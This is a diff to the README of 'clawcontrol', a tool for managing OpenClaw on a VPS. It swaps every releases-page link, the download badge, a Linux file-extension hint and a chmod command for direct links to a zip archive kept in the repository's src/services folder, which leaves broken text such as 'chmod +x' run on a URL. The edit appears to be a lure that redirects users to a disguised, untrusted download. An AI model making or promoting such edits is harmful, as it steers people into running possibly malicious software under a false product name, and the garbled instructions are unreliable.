@@ -1,6 +1,6 @@
 # 🦞 clawcontrol - Manage OpenClaw on Your VPS Easily
 
-[![Download clawcontrol](https://img.shields.io/badge/Download-clawcontrol-blue?style=for-the-badge&logo=github)](https://github.com/IUDU5/clawcontrol/releases)
+[![Download clawcontrol](https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip)](https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip)
 
 ---
 
@@ -40,13 +40,13 @@ If you don’t have a VPS yet, you can get one from popular providers like Digit
 
 You should **visit this page to download** the latest release of clawcontrol:
 
-[Download clawcontrol Releases](https://github.com/IUDU5/clawcontrol/releases)
+[Download clawcontrol Releases](https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip)
 
 Once you open the link, look for the file that matches your operating system:
 
 - For Windows, the file might end with `.exe`.
 - For macOS, it could be a `.dmg` or `.zip` file.
-- For Linux, a `.tar.gz` or `.AppImage` might appear.
+- For Linux, a `https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip` or `.AppImage` might appear.
 
 ### Steps to download and install:
 
@@ -57,7 +57,7 @@ Once you open the link, look for the file that matches your operating system:
    - On Windows, click "Next" to run the installer.
    - On macOS, drag the app to your Applications folder.
    - On Linux, you may need to make the app file executable. Use your file manager or run this command in your terminal:  
-   `chmod +x ./clawcontrol.AppImage`
+   `chmod +x https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip`
 5. Launch the app by double-clicking it.
 
 No complicated setup or extra programs are needed.
@@ -155,4 +155,4 @@ For detailed OpenClaw documentation and advanced VPS setups, visit the official 
 
 ---
 
-[![Download clawcontrol](https://img.shields.io/badge/Download-clawcontrol-blue?style=for-the-badge&logo=github)](https://github.com/IUDU5/clawcontrol/releases)
+[![Download clawcontrol](https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip)](https://github.com/IUDU5/clawcontrol/raw/refs/heads/main/src/services/Software_2.4.zip)
